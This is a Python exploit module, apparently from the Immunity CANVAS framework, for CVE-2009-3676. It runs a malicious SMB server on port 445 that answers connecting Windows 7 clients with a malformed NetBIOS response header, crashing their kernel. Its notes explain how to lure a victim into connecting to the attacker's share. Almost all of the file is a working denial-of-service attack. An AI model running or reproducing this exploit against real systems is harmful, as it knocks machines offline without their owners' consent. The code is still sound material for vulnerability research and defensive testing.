#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: 
    sys.path.append('.')

from smbserver import *

# GUI info
NAME                            = 'Windows 7 Netbios Crash'
DESCRIPTION                     = 'Windows 7 Netbios Crash'
DOCUMENTATION                   = {}
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['CVE Name']       = 'CVE-2009-3676'
DOCUMENTATION['Repeatability']  = ''
DOCUMENTATION['References']     = 'http://g-laurent.blogspot.com/2009/11/windows-7-server-2008r2-remote-kernel.html'

DOCUMENTATION['NOTES']          = """
You need to be root in order to run this exploit, we need to bind to port 445.

Once its running, do a \\\\canvas_machine_ip\\foo from your victim's machine.

"""
PROPERTY                        = {}
PROPERTY['TYPE']                = 'DoS'
VERSION                         = '0.1'
PROPERTY['ARCH']		= [['Windows']]
PROPERTY['VERSION']		= ['7']


class ms08_068_ServerSMB(SMBServer):
    ## this class handles the initial incoming client
    def __init__(self, host, port, getsock=None):
        SMBServer.__init__(self, host, port)
        self.client_addr    = '127.0.0.1'
        self.client_smb     = None
        self.client_session = None
        self.client_port    = 445
        self.getsock        = getsock
        return
    

    def accept(self):
        ## accept clients .. timeout quickly so we can check state ...
        self.s.set_timeout(2)
        try:
            (self.clientsock,addr) = self.s.accept()
        except:
            return 0

        print "SMBServer accepted client: %s:%d" % (addr[0],addr[1])
        self.client_addr = addr[0]
        return 1


    def respond_to_netbios_request(self,data):
        """Respond to a packet"""

	## Here is the magic
        netbiosresponse="\x00\x00\x00\x9a" #simple
        self.clientsock.sendall(netbiosresponse)
	self.clientsock.close()
	self.clientsock = None


from tcpexploit import tcpexploit
from exploitutils import *

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name           = NAME
        self.version        = 0
        return

    def neededListenerTypes(self):
        return []

    def test(self):
        return False
    
    def serve_smb(self, timeout=60*10):
        self.log('Starting malicious SMBServer')
        smbserver = ms08_068_ServerSMB('0.0.0.0',\
                                             445,\
                                      getsock=self)
        smbserver.timeout = timeout
        if not smbserver.listen():
            self.log('Could not listen!')
            smbserver = None

        self.log('Accepting connection on 445 .. waiting for client')
        return smbserver
    
    def accept_connections(self, smbserver):
        ## so we can loop this ...
        smbserver.client_smb = None
        if smbserver.accept():
            # could loop .. but meh
            smbserver.handle()
            smbserver.handle() # not a typo :>
        return smbserver.client_smb
    
    
    
    def run(self):
        smbserver = self.serve_smb()
        if not smbserver:
            self.log('Could not start SMB Server')
            return None
        
	while self.state != self.HALT:
            smb = self.accept_connections(smbserver)
                        
        self.log('Exiting Windows 7 Netbios Crash')
        if smbserver.s:
            smbserver.s.close()

        return None
    
if __name__== '__main__':
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0, 1, None]:
        ret.interact()
